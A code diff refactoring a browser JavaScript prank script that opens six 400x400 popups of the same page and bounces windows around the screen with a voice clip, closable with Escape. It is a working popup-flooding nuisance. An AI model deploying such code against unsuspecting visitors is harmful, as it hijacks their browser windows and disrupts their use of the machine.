@@ -1,8 +1,8 @@
 const voice = document.getElementById("mortVoice");
 
-let xOff = 5;
-let yOff = 5;
-let xPos = 400;
+let xOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 3);
+let yOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 3);
+let xPos = 100;
 let yPos = 100;
 let flagRun = 1;
 
@@ -12,72 +12,73 @@ function playVoice() {
   voice.play().catch(() => {});
 }
 
-function openWindow(url) {
+function openWindow() {
+  const width = 400;
+  const height = 400;
+  const left = Math.max(
+    screen.availLeft,
+    Math.min(
+      screen.availLeft + screen.availWidth - width,
+      Math.round(screen.availLeft + Math.random() * Math.max(1, screen.availWidth - width))
+    )
+  );
+  const top = Math.max(
+    screen.availTop,
+    Math.min(
+      screen.availTop + screen.availHeight - height,
+      Math.round(screen.availTop + Math.random() * Math.max(1, screen.availHeight - height))
+    )
+  );
+
   return window.open(
-    url,
+    `${window.location.pathname}?mort=1${window.location.hash}`,
     "_blank",
-    "menubar=no,status=no,toolbar=no,resizable=no,width=400,height=400,titlebar=no"
+    `popup=yes,width=${width},height=${height},left=${left},top=${top},resizable=no,scrollbars=no`
   );
 }
 
 function procreate() {
   for (let i = 0; i < 6; i++) {
-    openWindow(`${window.location.pathname}?mort=1${window.location.hash}`);
+    openWindow();
   }
-}
-
-function newXlt() {
-  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-  window.focus();
-}
-
-function newXrt() {
-  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
-}
-
-function newYup() {
-  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-}
-
-function newYdn() {
-  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
-}
-
-function fOff() {
-  flagRun = 0;
 }
 
 function playBall() {
   xPos += xOff;
   yPos += yOff;
 
-  if (xPos > screen.availWidth - 400) {
-    newXlt();
+  const minX = screen.availLeft;
+  const minY = screen.availTop;
+  const maxX = minX + screen.availWidth - window.outerWidth;
+  const maxY = minY + screen.availHeight - window.outerHeight;
+
+  if (xPos >= maxX) {
+    xPos = maxX;
+    xOff = -Math.abs(xOff);
+  } else if (xPos <= minX) {
+    xPos = minX;
+    xOff = Math.abs(xOff);
   }
 
-  if (xPos < screen.availLeft) {
-    newXrt();
-  }
-
-  if (yPos > screen.availHeight - 400) {
-    newYup();
-  }
-
-  if (yPos < screen.availTop) {
-    newYdn();
+  if (yPos >= maxY) {
+    yPos = maxY;
+    yOff = -Math.abs(yOff);
+  } else if (yPos <= minY) {
+    yPos = minY;
+    yOff = Math.abs(yOff);
   }
 
   if (flagRun === 1) {
     try {
       window.moveTo(Math.round(xPos), Math.round(yPos));
     } catch (_) {}
-    setTimeout(playBall, 1);
+    requestAnimationFrame(playBall);
   }
 }
 
 function handleKeyDown(event) {
   if (event.key === "Escape") {
-    fOff();
+    flagRun = 0;
     try {
       window.close();
     } catch (_) {}
@@ -91,9 +92,7 @@ function handleKeyDown(event) {
 window.addEventListener("keydown", handleKeyDown);
 
 if (window.opener) {
-  xPos = window.screenX;
-  yPos = window.screenY;
-  xOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 4);
-  yOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 4);
+  xPos = Math.max(screen.availLeft, Math.min(window.screenX, screen.availLeft + screen.availWidth - window.outerWidth));
+  yPos = Math.max(screen.availTop, Math.min(window.screenY, screen.availTop + screen.availHeight - window.outerHeight));
   playBall();
 }
